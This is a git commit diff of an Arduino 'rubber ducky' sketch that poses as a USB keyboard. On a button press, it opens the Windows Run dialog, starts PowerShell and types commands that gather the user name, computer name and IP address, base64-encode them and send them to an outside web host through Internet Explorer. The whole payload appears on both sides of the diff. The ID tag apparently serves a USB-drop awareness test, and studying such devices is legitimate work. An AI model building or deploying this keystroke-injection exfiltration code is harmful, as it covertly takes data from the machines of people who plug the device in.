6775f631455498a200caa8e8f562bcc469aee97f
b0tting <74Dollars>
2018-01-20 22:42:18 +0100

    Code cleanup
    Signed-off-by: b0tting <74Dollars>

--- arduino/rubberducky.ino
+++ arduino/rubberducky.ino
@@ -1,25 +1,27 @@
-  #include <Keyboard.h>
+#include <Keyboard.h>
+
+// Random ID so we can identify our ducky in a later stage. Enter anything. 
+// Just be sure to change this value before uploading to your ducky
+String MYID = "123";  
 
 int val = 0;    // variable
-String MYID = "123";
-int lightstart = 0;
 bool button_press = false;
 
 void setup() {
-  Serial.begin(9600);      // open the serial port at 9600 bps:    
+  Serial.begin(9600);      
   pinMode(13, OUTPUT);     
   pinMode(8, INPUT);
   Keyboard.begin();
 }
 
-void betterPrintln(String line, int mydelay = 20, bool pressenter = false) {
-        Serial.println("Keyboard emulating: " + line);
-        Keyboard.println(line);
-        if(pressenter) {
-          Keyboard.press(KEY_RETURN);
-          Keyboard.releaseAll();
-        }
-        delay(mydelay);  
+void betterPrintln(String line, int mydelay = 20, bool pressEnter = false) {
+  Serial.println("Keyboard emulating: " + line);
+  Keyboard.println(line);
+  if(pressEnter) {
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+  }
+  delay(mydelay);  
 }
 
 void loop() {         
@@ -29,26 +31,30 @@ void loop() {
       digitalWrite(13, HIGH);
   } else if (button_press && val == LOW) {
     Serial.write("Got a button press!");
-      delay(100);
-      val = digitalRead(8);
-      if(val == LOW) {
-        Keyboard.press(KEY_LEFT_GUI);
-        Keyboard.press('r');
-        delay(50);
-        Keyboard.releaseAll();
-        delay(20);
-        betterPrintln("powershell", 300, true);
-        betterPrintln("$var = \" ducky" + MYID +";\" + $env:USERNAME + \" ;\" + $env:COMPUTERNAME + \" ;\" ;");
-        betterPrintln("$ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;");
-        betterPrintln("$var += $ip.IPV4Address.IPAddressToString ;");
-        betterPrintln("$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var)) ;");
-        betterPrintln("$var = $var.replace('B', '_') ;");
-        betterPrintln("$IE=new-object -com internetexplorer.application ;");
-        betterPrintln("$IE.navigate2(\" https://www.qaulogy.com/ducky/ducky/\" + $var) ;");
-        betterPrintln("$IE.visible=$true ;", 30, true);
-        betterPrintln("exit", 50, true);
-        digitalWrite(13, LOW);
-        button_press = false;
+    delay(100);
+    val = digitalRead(8);
+    if(val == LOW) {
+      // Open the Windows executor gui screen
+      Keyboard.press(KEY_LEFT_GUI);
+      Keyboard.press('r');
+      delay(50);
+      Keyboard.releaseAll();
+      delay(20);
+      // Enter "powershell" and execute
+      betterPrintln("powershell", 300, true);
+
+      // Run our powershell script        
+      betterPrintln("$var = \" ducky" + MYID +";\" + $env:USERNAME + \" ;\" + $env:COMPUTERNAME + \" ;\" ;");
+      betterPrintln("$ip = Test-Connection -ComputerName $env:COMPUTERNAME -Count 1  | Select IPV4Address ;");
+      betterPrintln("$var += $ip.IPV4Address.IPAddressToString ;");
+      betterPrintln("$var = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($var)) ;");
+      betterPrintln("$var = $var.replace('B', '_') ;");
+      betterPrintln("$IE=new-object -com internetexplorer.application ;");
+      betterPrintln("$IE.navigate2(\" https://www.qaulogy.com/ducky/ducky/\" + $var) ;");
+      betterPrintln("$IE.visible=$true ;", 30, true);
+      betterPrintln("exit", 50, true);
+      digitalWrite(13, LOW);
+      button_press = false;
     }
   }
 } 
